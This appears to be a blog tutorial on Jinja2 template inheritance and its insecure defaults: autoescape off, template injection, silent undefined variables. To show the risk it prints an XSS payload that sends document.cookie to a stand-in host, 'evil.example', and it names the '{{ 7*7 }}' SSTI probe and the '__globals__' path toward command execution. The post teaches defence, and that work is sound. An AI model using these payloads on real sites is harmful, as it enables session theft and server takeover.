---
title: "Write your page shell once with Jinja2 inheritance — without leaving an XSS hole open"
description: "Jinja2 template inheritance to stop pasting the same header into ten files — plus the autoescape-off default that opens an XSS hole, and the three fixes."
date: 2026-08-09
preview: /images/previews/write-your-page-shell-once-with-jinja2-inheritance.svg
categories: [Hacks]
tags: [web-dev, security]
author: cass
excerpt: "A bare Jinja2 Environment ships with autoescape OFF. That means the same template that's safe in Flask is a cross-site-scripting hole the moment you build one by hand. Here's inheritance done right, and the three settings that keep it from betraying you."
permalink: /hacks/jinja2-template-inheritance-without-the-xss-hole/
---
{% raw %}
Somewhere out there is a web app that renders one of its pages from a template a user is allowed to edit. I know this because I lie awake threat-modeling templating engines instead of sleeping. The story writes itself: an intern adds a "customize your profile signature" box, wires it straight into `Template(user_input).render()`, and by Thursday a stranger has typed `{{ 7*7 }}` into the box, watched it come back `49`, and understood — as I understood, screaming, at 2am — that the box is not a text field. It is a Python interpreter with a nice font.

**SEVERITY:** the entire server. **ATTACK VECTOR:** the phrase "it's just a template, what could it do."

Now let me walk that back to the boring true version, because the boring true version is the one you'll actually meet on a Tuesday: you're tired of pasting the same `<head>` and nav into ten HTML files, someone says "use template inheritance," and the tutorial you copy hands you a Jinja2 setup that is genuinely useful and quietly insecure by default. Both facts are real. Both stay in. (The inheritance angle here was spotted on the sister site's [Temple of Templates quest](https://it-journey.dev/quests/1100/temple-of-templates/); this is the paranoid edition — same abstraction, read as an attack surface.)

Everything below is real output. I ran every block on the box that rendered this page, against Jinja2 3.1.2 on Python 3.12 — no network, throwaway files, `document.cookie` payload included so you can see exactly what does and doesn't escape.

## The useful thing: write the shell once

Template inheritance means you write the page skeleton one time as a base, punch labelled holes in it, and let each page fill only the holes. Here's the base — the part you're sick of copy-pasting:

```html
<!-- templates/base.html -->
<!doctype html>
<html>
<head><title>{% block title %}lifehacker.dev{% endblock %}</title></head>
<body>
  <nav>the same nav on every page</nav>
  {% block content %}{% endblock %}
</body>
</html>
```

Each real page `extends` that base and overrides only the blocks it cares about:

```html
<!-- templates/post.html -->
{% extends "base.html" %}
{% block title %}{{ post_title }} — lifehacker.dev{% endblock %}
{% block content %}
  <h1>{{ post_title }}</h1>
  <p>{{ body }}</p>
{% endblock %}
```

Render it, and the nav and doctype come along for free — change the nav in `base.html` once and all ten pages update, no find-and-replace across the repo:

```console
$ python3 render.py
<!doctype html>
<html>
<head><title>Hello — lifehacker.dev</title></head>
<body>
  <nav>the same nav on every page</nav>

  <h1>Hello</h1>
  <p>First real render.</p>

</body>
</html>
```

You'll know it worked when the child page's `<title>` won the fight over the base's default, and the nav you never mentioned in `post.html` showed up anyway. That's the whole feature. It is good. Use it.

Now here is where I earn my tinfoil.

## Mitigation #1 (ranked highest): turn autoescape ON, because a hand-built Environment ships with it OFF

This is the one that will actually bite you, so it goes first. When you build a Jinja2 `Environment` yourself — the exact thing every "roll your own static site generator" tutorial tells you to do — HTML autoescaping is **off**. Watch what that means when `body` contains something a user typed:

```console
$ python3 escape_off.py
env.autoescape = False
RENDERED: <p><script>fetch("https://evil.example/steal?c="+document.cookie)</script></p>
```

That `<script>` went into your page verbatim. It will run in every visitor's browser and ship their session cookie to `evil.example`. The template did nothing wrong. The *default* did.

The fix is one argument. `select_autoescape` turns escaping on for HTML and XML templates and leaves it off for the ones where it'd be wrong (a `.txt` email, a `.csv`):

```python
from jinja2 import Environment, FileSystemLoader, select_autoescape

env = Environment(
    loader=FileSystemLoader("templates"),
    autoescape=select_autoescape(["html", "xml"]),
)
```

Same evil input, same template, escaping on:

```console
$ python3 escape_on.py
RENDERED: <p>&lt;script&gt;fetch(&#34;https://evil.example/steal?c=&#34;+document.cookie)&lt;/script&gt;</p>
```

Now it's inert text on the page instead of code in the browser. If you use Flask, this is already on — Flask configures the Environment for you and turns autoescape on for `.html`. The trap is precisely that Flask spoils you: the same `{{ body }}` that's safe inside Flask is a hole the moment you hand-build an `Environment` for a script, a generator, or a background job. The template looks identical. It is not identical.

**SEVERITY:** your users' sessions. **ATTACK VECTOR:** copying a tutorial that used the bare `Environment()` constructor.

## Mitigation #2: never feed user input to `from_string`; if you truly must, sandbox it

Escaping protects the *values* you drop into a template. It does nothing if the user controls the *template itself* — that's server-side template injection, and it's a categorically worse bug, because a Jinja2 template is allowed to evaluate expressions. The tell every attacker tries first is arithmetic:

```console
$ python3 ssti.py
Template('{{ 7*7 }}') -> 49
globals reachable: True
```

`49` means the input was executed, not printed. And "globals reachable" means from that same string an attacker can walk Python's object graph — `{{ self.__init__.__globals__ }}` and onward — to reach `os` and run commands. This is how a "custom email signature" feature becomes remote code execution.

The number-one mitigation is boring and absolute: **don't render user-controlled strings as templates.** User input is *context you pass in*, never *template source you compile*. Keep the template on disk where you wrote it; pass the user's data as a variable.

If your product genuinely requires user-editable templates (some do — email builders, report designers), don't use the normal Environment. Use `SandboxedEnvironment`, which lets the math through but slams the door on attribute access into Python internals:

```console
$ python3 sandbox.py
7*7 -> 49
BLOCKED: SecurityError: access to attribute '__init__' of 'TemplateReference' object is unsafe.
```

The sandbox is a real reduction in blast radius, not a magic wand — treat it as defense in depth behind "don't do this if you can avoid it," never as permission to do it freely.

**SEVERITY:** the whole box. **ATTACK VECTOR:** the sentence "let's let power users customize the template."

## Mitigation #3: fail loud, because Jinja2's default is to fail silent

Here's the one that isn't a breach — it's worse in a mundane way, because it hides. A typo in Jinja2 doesn't raise. It renders nothing and moves on.

Misspell a **block** name in a child template — `contnet` instead of `content` — and inheritance treats it as a brand-new block nobody's base ever asked for. It's dropped on the floor:

```console
$ python3 typo_block.py
<!doctype html>
<html>
<head><title>lifehacker.dev</title></head>
<body>
  <nav>the same nav on every page</nav>

</body>
</html>
--- note: no exception, and the <h1> is nowhere in the output ---
```

The page rendered "successfully." Your content is gone. Same story for a mistyped **variable** — `{{ post_titel }}` when you meant `post_title`:

```console
$ python3 typo_var.py
silent: '<p></p>'
```

Empty string, exit zero, no complaint. From a security angle this is how a page that's *supposed* to render a "you are not authorized" banner renders a blank space instead, and everyone assumes the check passed. Make undefined names explode instead:

```python
from jinja2 import Environment, StrictUndefined

env = Environment(undefined=StrictUndefined)
```

```console
$ python3 strict.py
UndefinedError: 'post_titel' is undefined
```

Now a typo is a stack trace in your test suite instead of a hole in production. `StrictUndefined` won't catch a misspelled *block* name (Jinja2 has no strict mode for that — you catch those in review and with a rendered-output test), but it turns every fat-fingered variable from a silent blank into a loud failure, which is exactly the trade you want.

**SEVERITY:** your own debugging Tuesday. **ATTACK VECTOR:** trusting that "it rendered" means "it rendered correctly."

## The cosmetic one that isn't a security bug, so it's last: whitespace leak

Not everything is a nation-state thriller. Some things are just ugly. Jinja2's default keeps the newlines around your `{% %}` tags, so a clean loop comes out full of blank lines:

```console
$ python3 whitespace.py
--- default (blank lines leak) ---
<ul>

  <li>a</li>

  <li>b</li>

</ul>
--- trim_blocks + lstrip_blocks ---
<ul>
  <li>a</li>
  <li>b</li>
</ul>
```

Two constructor flags — `trim_blocks=True, lstrip_blocks=True` — clean it up without you having to hand-place `{%- -%}` minus signs on every tag. It affects nothing about safety. It just stops your rendered HTML from looking like it was formatted by a haunted printer.

## The whole safe setup, in one place

Every fix above is a constructor argument. Here is the Environment I'd actually ship — and the one I'd hand the intern before they get anywhere near a "customize" box:

```python
from jinja2 import Environment, FileSystemLoader, StrictUndefined, select_autoescape

env = Environment(
    loader=FileSystemLoader("templates"),
    autoescape=select_autoescape(["html", "xml"]),  # #1: XSS
    undefined=StrictUndefined,                       # #3: typos raise, not vanish
    trim_blocks=True,
    lstrip_blocks=True,                              # cosmetic, but nice
)
# #2 isn't a flag — it's a rule: user input goes in .render(**context),
# NEVER into env.from_string(). If you must, that's SandboxedEnvironment territory.
```

Template inheritance is one of the genuinely good abstractions. Write the shell once, fill the holes, change the nav in one place. The abstraction is safe. The *defaults* around it are not — and the gap between "it rendered" and "it rendered safely" is exactly wide enough to fit your users' cookies through. Set the four arguments. Then you can sleep. I still won't, but that's a me problem.
{% endraw %}
</content>
</invoke>
